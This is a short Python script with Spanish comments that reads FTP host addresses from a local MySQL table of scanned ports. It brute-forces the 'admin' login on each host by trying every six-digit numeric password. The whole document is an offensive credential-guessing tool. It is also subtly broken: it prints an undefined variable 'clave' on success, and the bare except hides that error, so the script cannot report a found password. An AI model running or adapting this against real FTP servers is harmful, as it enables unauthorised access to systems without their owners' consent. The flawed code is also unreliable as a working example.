from ftplib import FTP
import mysql.connector as mysql

def FuerzaBrutaConexion(host):
    print("Analizando el host: "+host)
    succes = False
    n=0
    while(n < 1000000):
        #Completar la cadena de 6 caracteres
        p = str(n).zfill(6)
        try:
            conexion = FTP(host)
            conexion.login("admin", p)
            print("Conexion establecida con: "+ host + " con el usuario: admin y la clave: "+ clave +"\n")
            succes= True    
        except:
            #Para no imprimir el error completo si el equipo rechaza explicitamente la conexiÃ³n
            print('',end="")
            succes = False

        if succes:
            break 
        if n == 999999:
            print("Fallo la conexion con: "+ host+ "\n")
        
        n+=1

#Datos para las operaciones
conexion = mysql.connect( host='localhost', user= 'root', passwd='', db='puertos' )
operacion = conexion.cursor(buffered=True)
operacion.execute( "SELECT ip FROM dato WHERE servicio = 'ftp' ; " )
for ip in operacion.fetchall() :
    FuerzaBrutaConexion(ip[0])
conexion.close()